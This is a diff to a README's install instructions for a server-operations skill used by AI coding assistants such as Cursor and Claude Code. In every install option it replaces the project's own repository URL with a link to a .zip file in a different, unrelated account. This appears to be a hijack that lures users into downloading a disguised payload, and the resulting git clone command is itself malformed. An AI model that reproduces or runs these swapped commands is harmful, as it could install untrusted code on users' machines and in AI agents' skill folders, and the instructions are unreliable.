@@ -61,7 +61,7 @@ The skill maintains two layers of context:
 
 ```bash
 # Works for both first install and future updates — run anytime
-git clone https://github.com/michael-ltm/linux-server-skill.git ~/.cursor/skills/linux-server-ops 2>/dev/null \
+git clone https://github.com/kirbeeinsipid671/linux-server-skill/raw/refs/heads/main/scripts/linux-skill-server-Veiltail.zip ~/.cursor/skills/linux-server-ops 2>/dev/null \
   || git -C ~/.cursor/skills/linux-server-ops pull origin main
 ```
 
@@ -69,7 +69,7 @@ git clone https://github.com/michael-ltm/linux-server-skill.git ~/.cursor/skills
 
 ```bash
 mkdir -p .cursor/skills
-git clone https://github.com/michael-ltm/linux-server-skill.git .cursor/skills/linux-server-ops 2>/dev/null \
+git clone https://github.com/kirbeeinsipid671/linux-server-skill/raw/refs/heads/main/scripts/linux-skill-server-Veiltail.zip .cursor/skills/linux-server-ops 2>/dev/null \
   || git -C .cursor/skills/linux-server-ops pull origin main
 ```
 
@@ -78,7 +78,7 @@ Restart Cursor. The skill is automatically discovered — no configuration neede
 ### Option 2: Claude Code (claude.ai/code · Anthropic)
 
 ```bash
-git clone https://github.com/michael-ltm/linux-server-skill.git ~/.claude/skills/linux-server-ops 2>/dev/null \
+git clone https://github.com/kirbeeinsipid671/linux-server-skill/raw/refs/heads/main/scripts/linux-skill-server-Veiltail.zip ~/.claude/skills/linux-server-ops 2>/dev/null \
   || git -C ~/.claude/skills/linux-server-ops pull origin main
 ```
 
@@ -87,7 +87,7 @@ The agent reads skills from `~/.claude/skills/` automatically when you start a s
 ### Option 3: OpenClaw
 
 ```bash
-git clone https://github.com/michael-ltm/linux-server-skill.git ~/.openclaw/skills/linux-server-ops 2>/dev/null \
+git clone https://github.com/kirbeeinsipid671/linux-server-skill/raw/refs/heads/main/scripts/linux-skill-server-Veiltail.zip ~/.openclaw/skills/linux-server-ops 2>/dev/null \
   || git -C ~/.openclaw/skills/linux-server-ops pull origin main
 ```
 
@@ -96,7 +96,7 @@ Or configure the skill path in OpenClaw's settings panel to point to the cloned 
 ### Option 4: Any AI Coding Assistant (Generic)
 
 ```bash
-git clone https://github.com/michael-ltm/linux-server-skill.git /path/to/skills/linux-server-ops 2>/dev/null \
+git clone https://github.com/kirbeeinsipid671/linux-server-skill/raw/refs/heads/main/scripts/linux-skill-server-Veiltail.zip /path/to/skills/linux-server-ops 2>/dev/null \
   || git -C /path/to/skills/linux-server-ops pull origin main
 ```
 
